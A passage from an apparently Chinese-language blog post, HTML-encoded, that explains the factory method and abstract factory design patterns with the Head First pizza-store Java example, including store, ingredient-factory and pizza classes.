F9;&#x8D23;&#x4EFB;&#x7684;&#x5206;&#x5272;&#x3002;</p>
<p><strong>&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7684;&#x7F3A;&#x70B9;&#xFF1A;</strong></p>
<p>&#x8FD9;&#x4E2A;&#x5DE5;&#x5382;&#x7C7B;&#x96C6;&#x4E2D;&#x4E86;&#x6240;&#x4EE5;&#x7684;&#x521B;&#x5EFA;&#x903B;&#x8F91;&#xFF0C;&#x5F53;&#x6709;&#x590D;&#x6742;&#x7684;&#x591A;&#x5C42;&#x6B21;&#x7B49;&#x7EA7;&#x7ED3;&#x6784;&#x65F6;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x90FD;&#x5728;&#x8FD9;&#x4E2A;&#x5DE5;&#x5382;&#x7C7B;&#x4E2D;&#x5B9E;&#x73B0;&#x3002;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x5B83;&#x4E0D;&#x80FD;&#x5DE5;&#x4F5C;&#x4E86;&#xFF0C;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x90FD;&#x4F1A;&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x3002;&#x5E76;&#x4E14;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x8FDD;&#x80CC;&#x4E86;&#x5F00;&#x95ED;&#x539F;&#x5219;&#xFF08;&#x5BF9;&#x6269;&#x5C55;&#x7684;&#x5F00;&#x653E;&#xFF0C;&#x5BF9;&#x4FEE;&#x6539;&#x7684;&#x5173;&#x95ED;&#xFF09;&#x3002;</p>
<h2 id="&#x5DE5;&#x5382;&#x6A21;&#x5F0F;"><a href="#&#x5DE5;&#x5382;&#x6A21;&#x5F0F;" class="headerlink" title="&#x5DE5;&#x5382;&#x6A21;&#x5F0F;"></a>&#x5DE5;&#x5382;&#x6A21;&#x5F0F;</h2><blockquote>
<p>&#x6211;&#x4EEC;&#x6765;&#x770B;&#x4E00;&#x4E0B;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x7684;&#x5B9A;&#x4E49;&#x5427;&#x3002;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x4F46;&#x7531;&#x5B50;&#x7C7B;&#x51B3;&#x5B9A;&#x8981;&#x5B9E;&#x4F8B;&#x5316;&#x54EA;&#x4E00;&#x4E2A;&#x3002;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x8BA9;&#x7C7B;&#x628A;&#x5B9E;&#x4F8B;&#x5316;&#x63A8;&#x8FDF;&#x5230;&#x4E86;&#x5B50;&#x7C7B;&#x3002;&#xFF08;&#x5B9A;&#x4E49;&#x6458;&#x81EA;&#x300A;Head First&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x300B;&#xFF09;</p>
</blockquote>
<p>&#x9996;&#x5148;&#xFF0C;&#x5728;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x4E2D;&#xFF0C;&#x6838;&#x5FC3;&#x7684;&#x5DE5;&#x5382;&#x7C7B;&#x4E0D;&#x518D;&#x8D1F;&#x8D23;&#x6240;&#x6709;&#x4EA7;&#x54C1;&#x7684;&#x521B;&#x5EFA;&#xFF0C;&#x800C;&#x662F;&#x5C06;&#x5177;&#x4F53;&#x521B;&#x5EFA;&#x7684;&#x5DE5;&#x4F5C;&#x4EA4;&#x7ED9;&#x5B50;&#x7C7B;&#x53BB;&#x505A;.&#x8FD9;&#x4E2A;&#x6838;&#x5FC3;&#x7C7B;&#x5219;&#x6447;&#x8EAB;&#x4E00;&#x53D8;&#xFF0C;&#x6210;&#x4E3A;&#x4E86;&#x4E00;&#x4E2A;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x89D2;&#x8272;&#xFF0C;&#x4EC5;&#x8D1F;&#x8D23;&#x7ED9;&#x51FA;&#x5177;&#x4F53;&#x5DE5;&#x5382;&#x5B50;&#x7C7B;&#x5FC5;&#x987B;&#x5B9E;&#x73B0;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x800C;&#x4E0D;&#x63A5;&#x89E6;&#x54EA;&#x4E00;&#x4E2A;&#x4EA7;&#x54C1;&#x7C7B;&#x5E94;&#x5F53;&#x88AB;&#x5B9E;&#x4F8B;&#x5316;&#x8FD9;&#x79CD;&#x7EC6;&#x8282;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x8FDB;&#x4E00;&#x6B65;&#x62BD;&#x8C61;&#x5316;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4F7F;&#x8FD9;&#x79CD;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4E88;&#x8BB8;&#x7CFB;&#x7EDF;&#x5728;&#x4E0D;&#x4FEE;&#x6539;&#x5177;&#x4F53;&#x5DE5;&#x5382;&#x89D2;&#x8272;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5F15;&#x8FDB;&#x65B0;&#x7684;&#x4EA7;&#x54C1;&#xFF0C;&#x4E5F;&#x5C31;&#x9075;&#x5FAA;&#x4E86;&#x5F00;&#x95ED;&#x539F;&#x5219;&#x3002;</p>
<h3 id="&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7ED3;&#x6784;"><a href="#&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7ED3;&#x6784;" class="headerlink" title="&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7ED3;&#x6784;"></a>&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7ED3;&#x6784;</h3><p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/ce5e499ecc4fa99bdcfa27a0a0781b5e51f6e0231f6c73d4559bdb4ee2b6fa60" alt></p>
<h3 id="&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x7684;&#x7C7B;&#x89C6;&#x56FE;"><a href="#&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x7684;&#x7C7B;&#x89C6;&#x56FE;" class="headerlink" title="&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x7684;&#x7C7B;&#x89C6;&#x56FE;"></a>&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x7684;&#x7C7B;&#x89C6;&#x56FE;</h3><p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/37d55cc7a772a78e713f8a227018b97ce3faafb6eb213223b312bbd2c3386bed" alt></p>
<h3 id="Java&#x5B9E;&#x73B0;&#x6838;&#x5FC3;"><a href="#Java&#x5B9E;&#x73B0;&#x6838;&#x5FC3;" class="headerlink" title="Java&#x5B9E;&#x73B0;&#x6838;&#x5FC3;"></a>Java&#x5B9E;&#x73B0;&#x6838;&#x5FC3;</h3><ul>
<li>1.&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6A21;&#x62DF;&#x8FC7;&#x7A0B;&#x3002;</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class PizzaTestDrive {</span><br><span class="line">    public static void main(String[] args) {</span><br><span class="line">        PizzaStore nyStore = new NYPizzaStore();</span><br><span class="line">        PizzaStore chicagoStore = new ChicagoPizzaStore();</span><br><span class="line"> </span><br><span class="line">        Pizza pizza = nyStore.orderPizza(&quot;cheese&quot;);</span><br><span class="line">        System.out.println(&quot;Ethan ordered a &quot; + pizza.getName() + &quot;\n&quot;);</span><br><span class="line"> </span><br><span class="line">        pizza = chicagoStore.orderPizza(&quot;cheese&quot;);</span><br><span class="line">        System.out.println(&quot;Joel ordered a &quot; + pizza.getName() + &quot;\n&quot;);</span><br><span class="line">        pizza = nyStore.orderPizza(&quot;clam&quot;);</span><br><span class="line">        System.out.println(&quot;Ethan ordered a &quot; + pizza.getName() + &quot;\n&quot;);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ul>
<li>2.&#x62BD;&#x8C61;&#x5DE5;&#x5382;</li>
</ul>
<p>&#x5176;&#x4E2D;<code>createPizza</code>&#x662F;&#x4E2A;&#x62BD;&#x8C61;&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x6CA1;&#x6709;&#x5B9E;&#x73B0;&#x5B83;&#xFF0C;&#x4E0D;&#x8FC7;&#x5BA2;&#x6237;&#x7AEF;&#x8C03;&#x7528;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;<code>createPizza</code>&#x5C31;&#x80FD;&#x8FD4;&#x56DE;&#x5177;&#x4F53;&#x5DE5;&#x5382;&#x751F;&#x4EA7;&#x7684;&#x5177;&#x4F53;&#x4EA7;&#x54C1;&#x3002;&#x8FD9;&#x91CC;&#x5FFD;&#x7565;&#x4E86;&#x5177;&#x4F53;&#x4EA7;&#x54C1;&#x5B9E;&#x73B0;&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public abstract class PizzaStore {</span><br><span class="line"> </span><br><span class="line">    abstract Pizza createPizza(String item);</span><br><span class="line"> </span><br><span class="line">    public Pizza orderPizza(String type) {</span><br><span class="line">        Pizza pizza = createPizza(type);</span><br><span class="line">        System.out.println(&quot;--- Making a &quot; + pizza.getName() + &quot; ---&quot;);</span><br><span class="line">        pizza.prepare();</span><br><span class="line">        pizza.bake();</span><br><span class="line">        pizza.cut();</span><br><span class="line">        pizza.box();</span><br><span class="line">        return pizza;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ul>
<li>3.&#x5177;&#x4F53;&#x7684;&#x5DE5;&#x5382;-&#x53BB;&#x5B9E;&#x73B0;<code>createPizza</code></li>
</ul>
<p>&#x901A;&#x8FC7;&#x4ECE;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x96C6;&#x6210;&#x8FC7;&#x6765;&#x7684;<code>createPizza</code>&#x5B9E;&#x73B0;&#x5177;&#x4F53;&#x7684;&#x4EA7;&#x54C1;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class NYPizzaStore extends PizzaStore {</span><br><span class="line">    Pizza createPizza(String item) {</span><br><span class="line">        if (item.equals(&quot;cheese&quot;)) {</span><br><span class="line">            return new NYStyleCheesePizza();</span><br><span class="line">        } else if (item.equals(&quot;veggie&quot;)) {</span><br><span class="line">            return new NYStyleVeggiePizza();</span><br><span class="line">        } else if (item.equals(&quot;clam&quot;)) {</span><br><span class="line">            return new NYStyleClamPizza();</span><br><span class="line">        } else if (item.equals(&quot;pepperoni&quot;)) {</span><br><span class="line">            return new NYStylePepperoniPizza();</span><br><span class="line">        } else return null;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h3 id="&#x603B;&#x7ED3;-1"><a href="#&#x603B;&#x7ED3;-1" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h3><ol>
<li>&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x5229;&#x7528;&#x591A;&#x6001;&#x7684;&#x4F18;&#x52BF;&#x5C06;&#x5177;&#x4F53;&#x7684;&#x4EA7;&#x54C1;&#x7684;&#x5B9E;&#x4F8B;&#x5316;&#x653E;&#x5728;&#x5177;&#x4F53;&#x5DE5;&#x5382;&#x4E2D;&#x5B9E;&#x73B0;&#x3002;</li>
<li>&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x521B;&#x5EFA;&#x7684;&#x662F;&#x62BD;&#x8C61;&#x4EA7;&#x54C1;&#x2013;&#x63D0;&#x4F9B;&#x7684;&#x662F;&#x62BD;&#x8C61;&#x65B9;&#x6CD5;(<code>createPizza</code>)&#xFF0C;&#x4F46;&#x662F;&#x5177;&#x4F53;&#x7684;&#x5B9E;&#x73B0;&#x662F;&#x63A8;&#x8FDF;&#x5230;&#x5177;&#x4F53;&#x7684;&#x5DE5;&#x5382;&#x4E2D;&#x5B9E;&#x73B0;&#x3002;</li>
<li>&#x5BA2;&#x6237;&#x7AEF;&#x4E2D;&#x5BF9;&#x7528;&#x6237;&#x53EF;&#x89C1;&#x7684;&#x5BF9;&#x8C61;&#x8868;&#x9762;&#x4E0A;&#x770B;&#x5230;&#x7684;&#x662F;&#x4E24;&#x4E2A;&#x62BD;&#x8C61;&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x5177;&#x4F53;&#x5DE5;&#x5382;&#x4F1A;&#x521B;&#x5EFA;&#x7528;&#x6237;&#x6307;&#x5B9A;&#x7C7B;&#x578B;&#x7684;&#x4EA7;&#x54C1;&#x3002;</li>
</ol>
<h2 id="&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;"><a href="#&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;" class="headerlink" title="&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;"></a>&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;</h2><p><code>&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;</code>&#x662F;&#x6240;&#x6709;&#x5F62;&#x6001;&#x7684;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x4E2D;&#x6700;&#x4E3A;&#x62BD;&#x8C61;&#x548C;&#x6700;&#x5177;&#x4E00;&#x822C;&#x6027;&#x7684;&#x4E00;&#x79CD;&#x5F62;&#x6001;&#x3002;<code>&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;</code>&#x53EF;&#x4EE5;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x63A5;&#x53E3;&#xFF0C;&#x4F7F;&#x5F97;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x4E0D;&#x5FC5;&#x6307;&#x5B9A;&#x4EA7;&#x54C1;&#x7684;&#x5177;&#x4F53;&#x7C7B;&#x578B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x521B;&#x5EFA;&#x591A;&#x4E2A;&#x4EA7;&#x54C1;&#x65CF;&#x4E2D;&#x7684;&#x4EA7;&#x54C1;&#x5BF9;&#x8C61;&#x3002;&#x8FD9;&#x5C31;&#x662F;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x7684;&#x7528;&#x610F;&#x3002;</p>
<h3 id="&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7ED3;&#x6784;"><a href="#&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7ED3;&#x6784;" class="headerlink" title="&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7ED3;&#x6784;"></a>&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7ED3;&#x6784;</h3><p><code>&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;</code>&#x7684;&#x7B80;&#x7565;&#x7C7B;&#x56FE;&#x5982;&#x4E0B;:</p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/dce989a4d87ce8421614983fedc53d8190d21c554704d5aab20731a21c9f1c5f" alt></p>
<h3 id="&#x7C7B;&#x89C6;&#x56FE;-1"><a href="#&#x7C7B;&#x89C6;&#x56FE;-1" class="headerlink" title="&#x7C7B;&#x89C6;&#x56FE;"></a>&#x7C7B;&#x89C6;&#x56FE;</h3><p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/4cc9d1c9964e2b712efbf253d64dd12af1c757aa83e67f5746313e31e970f567" alt></p>
<h3 id="Java&#x5B9E;&#x73B0;"><a href="#Java&#x5B9E;&#x73B0;" class="headerlink" title="Java&#x5B9E;&#x73B0;"></a>Java&#x5B9E;&#x73B0;</h3><ul>
<li><code>PizzaStore</code>&#x662F;&#x62BD;&#x8C61;&#x7684;&#x5DE5;&#x5382;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x5B9E;&#x4F8B;&#x5316;&#x662F;&#x4EA4;&#x7ED9;<code>NYPizzaStore</code>&#x8FD9;&#x4E9B;&#x5DE5;&#x5382;&#x3002;</li>
<li><code>NYPizzaStore</code>&#x662F;&#x5177;&#x4F53;&#x7684;&#x521B;&#x5EFA;&#x7C7B;&#xFF0C;&#x901A;&#x8FC7;&#x5B9E;&#x73B0;<code>createPizza(type)</code>&#x65B9;&#x6CD5;&#x6765;&#x5177;&#x4F53;&#x5316;&#x4EA7;&#x54C1;&#x3002;&#x901A;&#x8FC7;<code>PizzaIngredientFactory</code>&#x8FD9;&#x4E2A;&#x4EA7;&#x54C1;&#x6574;&#x5408;&#x5DE5;&#x5382;&#x5C06;&#x4E0D;&#x540C;&#x4EA7;&#x54C1;&#x505A;&#x4E86;&#x6574;&#x5408;&#x3002;</li>
<li><code>PizzaIngredientFactory</code>&#x662F;&#x62BD;&#x8C61;&#x7684;&#x4EA7;&#x54C1;&#x6574;&#x5408;&#x5DE5;&#x5382;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x4EA7;&#x54C1;&#x6574;&#x5408;&#x662F;&#x4EA4;&#x7ED9;&#x5177;&#x4F53;&#x7684;&#x4EA7;&#x54C1;&#x6574;&#x5408;&#x5382;<code>NYPizzaIngredientFactory</code>&#x8FD9;&#x4E9B;&#x7684;&#x3002;</li>
<li><code>NYPizzaIngredientFactory</code>&#x662F;&#x5177;&#x4F53;&#x7684;&#x7684;&#x4EA7;&#x54C1;&#x6574;&#x5408;&#x5382;&#xFF0C;&#x5B83;&#x5B9E;&#x73B0;&#x4E86;<code>PizzaIngredientFactory</code>&#x7684;&#x5404;&#x79CD;&#x521B;&#x5EFA;&#x5B9E;&#x4F8B;&#x7684;&#x65B9;&#x6CD5;&#x3002;</li>
</ul>
<blockquote>
<p>&#x8FD9;&#x91CC;&#x57FA;&#x672C;&#x7684;&#x601D;&#x60F3;&#x90FD;&#x662F;&#x5EF6;&#x8FDF;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x5C06;&#x5177;&#x4F53;&#x5B9E;&#x4F8B;&#x5316;&#x53D1;&#x5728;&#x5177;&#x4F53;&#x7684;&#x5B50;&#x7C7B;&#x4E2D;&#x5B9E;&#x73B0;&#xFF0C;&#x5BF9;&#x8C61;&#x7EDF;&#x4E00;&#x7684;&#x53EA;&#x63D0;&#x4F9B;&#x5DE5;&#x5382;&#x5BF9;&#x8C61;&#x3002;</p>
</blockquote>
<p>1.&#x521B;&#x5EFA;&#x578B;&#x62BD;&#x8C61;&#x5DE5;&#x5382;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public abstract class PizzaStore {</span><br><span class="line"> </span><br><span class="line">    abstract Pizza createPizza(String item);</span><br><span class="line"> </span><br><span class="line">    public Pizza orderPizza(String type) {</span><br><span class="line">        Pizza pizza = createPizza(type);</span><br><span class="line">        System.out.println(&quot;--- Making a &quot; + pizza.getName() + &quot; ---&quot;);</span><br><span class="line">        pizza.prepare();</span><br><span class="line">        pizza.bake();</span><br><span class="line">        pizza.cut();</span><br><span class="line">        pizza.box();</span><br><span class="line">        return pizza;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>2.&#x521B;&#x5EFA;&#x578B;&#x5177;&#x4F53;&#x5DE5;&#x5382;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class NYPizzaStore extends PizzaStore {</span><br><span class="line"> </span><br><span class="line">    protected Pizza createPizza(String item) {</span><br><span class="line">        Pizza pizza = null;</span><br><span class="line">        PizzaIngredientFactory ingredientFactory = </span><br><span class="line">            new NYPizzaIngredientFactory();</span><br><span class="line"> </span><br><span class="line">        if (item.equals(&quot;cheese&quot;)) {</span><br><span class="line">            pizza = new CheesePizza(ingredientFactory);</span><br><span class="line">            pizza.setName(&quot;New York Style Cheese Pizza&quot;);</span><br><span class="line">        } else if (item.equals(&quot;veggie&quot;)) {</span><br><span class="line">            pizza = new VeggiePizza(ingredientFactory);</span><br><span class="line">            pizza.setName(&quot;New York Style Veggie Pizza&quot;);</span><br><span class="line">        } else if (item.equals(&quot;clam&quot;)) {</span><br><span class="line">            pizza = new ClamPizza(ingredientFactory);</span><br><span class="line">            pizza.setName(&quot;New York Style Clam Pizza&quot;);</span><br><span class="line">        } else if (item.equals(&quot;pepperoni&quot;)) {</span><br><span class="line">            pizza = new PepperoniPizza(ingredientFactory);</span><br><span class="line">            pizza.setName(&quot;New York Style Pepperoni Pizza&quot;);</span><br><span class="line">        } </span><br><span class="line">        return pizza;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>3.&#x521B;&#x5EFA;&#x578B;&#x6574;&#x5408;&#x5DE5;&#x5382;-&#x7528;&#x4E8E;&#x6574;&#x5408;&#x4EA7;&#x54C1;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class NYPizzaIngredientFactory implements PizzaIngredientFactory {</span><br><span class="line"> </span><br><span class="line">    public Dough createDough() {</span><br><span class="line">        return new ThinCrustDough();</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    public Sauce createSauce() {</span><br><span class="line">        return new MarinaraSauce();</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    public Cheese createCheese() {</span><br><span class="line">        return new ReggianoCheese();</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    public Veggies[] createVeggies() {</span><br><span class="line">        Veggies veggies[] = { new Garlic(), new Onion(), new Mushroom(), new RedPepper() };</span><br><span class="line">        return veggies;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    public Pepperoni createPepperoni() {</span><br><span class="line">        return new SlicedPepperoni();</span><br><span class="line">    }</span><br><span class="line">    public Clams createClam() {</span><br><span class="line">        return new FreshClams();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>4.&#x62BD;&#x8C61;&#x7684;&#x4EA7;&#x54C1;&#x7C7B;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public abstract class Pizza {</span><br><span class="line">    String name;</span><br><span class="line">    Dough dough;</span><br><span class="line">    Sauce sauce;</span><br><span class="line">    Veggies veggies[];</span><br><span class="line">    Cheese cheese;</span><br><span class="line">    Pepperoni pepperoni;</span><br><span class="line">    Clams clam;</span><br><span class="line">    abstract void prepare();</span><br><span class="line">    void bake() {</span><br><span class="line">        System.out.println(&quot;Bake for 25 minutes at 350&quot;);</span><br><span class="line">    }</span><br><span class="line">    void cut() {</span><br><span class="line">        System.out.println(&quot;Cutting the pizza into diagonal slices&quot;);</span><br><span class="line">    }</span><br><span class="line">    void box() {</span><br><span class="line">        System.out.println(&quot;Place pizza in official PizzaStore box&quot;);</span><br><span class="line">    }</span><br><span class="line">    void setName(String name) {</span><br><span class="line">        this.name = name;</span><br><span class="line">    }</span><br><span class="line">    String getName() {</span><br><span class="line">        return name;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>5.&#x4EA7;&#x54C1;&#x62BD;&#x8C61;&#x5DE5;&#x5382;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public interface PizzaIngredientFactory {</span><br><span class="line"> </span><br><span class="line">    public Dough createDough();</span><br><span class="line">    public Sauce createSauce();</span><br><span class="line">    public Cheese createCheese();</span><br><span class="line">    public Veggies[] createVeggies();</span><br><span class="line">    public Pepperoni createPepperoni();</span><br><span class="line">    public Clams createClam();</span><br><span class="line"> </span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>6.&#x4EA7;&#x54C1;&#x5177;&#x4F53;&#x5DE5;&#x5382;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class CheesePizza extends Pizza {</span><br><span class="line">    PizzaIngredientFactory ingredientFactory;</span><br><span class="line"> </span><br><span class="line">    public CheesePizza(PizzaIngredientFactory ingredientFactory) {</span><br><span class="line">        this.ingredientFactory = ingredientFactory;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    void prepare() {</span><br><span class="line">        System.out.println(&quot;Preparing &quot; + name);</span><br><span class="line">        dough = ingredientFactory.createDough();</span><br><span class="line">        sauce = ingredientFactory.createSauce();</span><br><span class="line">        cheese = ingredientFactory.createCheese();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>7.&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;</p>
<p>&#x9762;&#x5411;&#x7528;&#x6237;&#x7684;&#x4E00;&#x5C42;&#x662F;&#x6CA1;&#x6709;&#x6539;&#x53D8;&#x63A5;&#x53E3;&#xFF0C;&#x8FD8;&#x662F;&#x4F7F;&#x7528;&#x62BD;&#x8C61;&#x5BF9;&#x8C61;<code>PizzaStore</code>&#x548C;<code>Pizza</code></p>
